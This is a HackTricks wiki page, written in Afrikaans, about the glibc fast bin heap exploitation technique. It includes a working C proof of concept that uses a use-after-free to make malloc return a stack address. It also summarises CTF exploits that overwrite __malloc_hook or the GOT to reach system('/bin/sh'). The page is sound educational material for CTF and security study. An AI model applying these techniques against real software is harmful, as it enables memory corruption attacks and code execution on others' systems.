# Fast Bin Attack

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Vir meer inligting oor wat 'n fast bin is, kyk na hierdie bladsy:

{{#ref}}
bins-and-memory-allocations.md
{{#endref}}

Omdat die fast bin 'n enkel-gelinkte lys is, is daar baie minder beskermings as in ander bins en net **die aanpassing van 'n adres in 'n vrygestelde fast bin** stuk is genoeg om **later 'n stuk in enige geheue adres te kan toewys**.

As opsomming:
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
Jy kan 'n volledige voorbeeld vind in 'n baie goed verduidelik kode van [https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html):
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
> [!CAUTION]
> As dit moontlik is om die waarde van die globale veranderlike **`global_max_fast`** met 'n groot getal te oorskryf, stel dit in staat om vinnige bin stukke van groter groottes te genereer, wat moontlik vinnige bin aanvalle in scenario's toelaat waar dit voorheen nie moontlik was nie. Hierdie situasie is nuttig in die konteks van [large bin attack](large-bin-attack.md) en [unsorted bin attack](unsorted-bin-attack.md)

## Voorbeelde

- **CTF** [**https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html)**:**
- Dit is moontlik om stukke toe te ken, hulle vry te stel, hul inhoud te lees en hulle te vul (met 'n oorgang kwesbaarheid).
- **Konsolideer stuk vir infoleak**: Die tegniek is basies om die oorgang te misbruik om 'n vals `prev_size` te skep sodat een vorige stuk in 'n groter een geplaas word, sodat wanneer die groter een wat 'n ander stuk bevat, toegeken word, dit moontlik is om sy data te druk en 'n adres na libc (`main_arena+88`) te lek.
- **Oorskryf malloc hook**: Hiervoor, en deur die vorige oorvleueling situasie te misbruik, was dit moontlik om 2 stukke te hê wat na dieselfde geheue gewys het. Daarom, deur hulle albei vry te stel (nog 'n stuk tussenin vry te stel om beskermings te vermy) was dit moontlik om dieselfde stuk in die vinnige bin 2 keer te hê. Toe was dit moontlik om dit weer toe te ken, die adres na die volgende stuk te oorskryf om 'n bietjie voor `__malloc_hook` te wys (sodat dit na 'n heelgetal wys wat malloc dink is 'n vrye grootte - nog 'n omseiling), dit weer toe te ken en dan 'n ander stuk toe te ken wat 'n adres na malloc hooks sal ontvang.\
Uiteindelik is 'n **one gadget** daar geskryf.
- **CTF** [**https://guyinatuxedo.github.io/28-fastbin_attack/csaw17_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin_attack/csaw17_auir/index.html)**:**
- Daar is 'n heap oorgang en gebruik na vry en dubbele vry omdat wanneer 'n stuk vrygestel word, dit moontlik is om die punters te hergebruik en weer vry te stel.
- **Libc info leak**: Vry net 'n paar stukke en hulle sal 'n punter na 'n deel van die hoof arena ligging kry. Aangesien jy vrygestelde punters kan hergebruik, lees net hierdie adres.
- **Fast bin aanval**: Al die punters na die toekennings word binne 'n array gestoor, so ons kan 'n paar vinnige bin stukke vrystel en in die laaste een die adres oorskryf om 'n bietjie voor hierdie array van punters te wys. Dan, ken 'n paar stukke met dieselfde grootte toe en ons sal eers die wettige een kry en dan die vals een wat die array van punters bevat. Ons kan nou hierdie toekenning punters oorskryf om die GOT adres van `free` na `system` te laat wys en dan `"/bin/sh"` in stuk 1 te skryf om dan `free(chunk1)` aan te roep wat in plaas daarvan `system("/bin/sh")` sal uitvoer.
- **CTF** [**https://guyinatuxedo.github.io/33-custom_misc_heap/csaw19_traveller/index.html**](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw19_traveller/index.html)
- Nog 'n voorbeeld van die misbruik van 'n een byte oorgang om stukke in die onsortering bin te konsolideer en 'n libc infoleak te kry en dan 'n vinnige bin aanval uit te voer om malloc hook met 'n een gadget adres te oorskryf.
- **CTF** [**https://guyinatuxedo.github.io/33-custom_misc_heap/csaw18_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw18_alienVSsamurai/index.html)
- Na 'n infoleak wat die onsortering bin misbruik met 'n UAF om 'n libc adres en 'n PIE adres te lek, het die uitbuiting van hierdie CTF 'n vinnige bin aanval gebruik om 'n stuk in 'n plek toe te ken waar die punters na beheerde stukke geleë was, sodat dit moontlik was om sekere punters oorgeskryf te word om 'n een gadget in die GOT te skryf.
- Jy kan 'n Fast Bin aanval vind wat deur 'n onsortering bin aanval misbruik word:
- Let daarop dat dit algemeen is om voor die uitvoering van vinnige bin aanvalle die vry-lis te misbruik om libc/heap adresse te lek (wanneer nodig).
- [**Robot Factory. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
- Ons kan slegs stukke van grootte groter as `0x100` toeken.
- Oorskryf `global_max_fast` met 'n Unsorted Bin aanval (werk 1/16 keer as gevolg van ASLR, omdat ons 12 bits moet verander, maar ons moet 16 bits verander).
- Vinnige Bin aanval om 'n globale array van stukke te verander. Dit bied 'n arbitrêre lees/schrijf primitief, wat toelaat om die GOT te verander en sommige funksies na `system` te laat wys.

{{#ref}}
unsorted-bin-attack.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
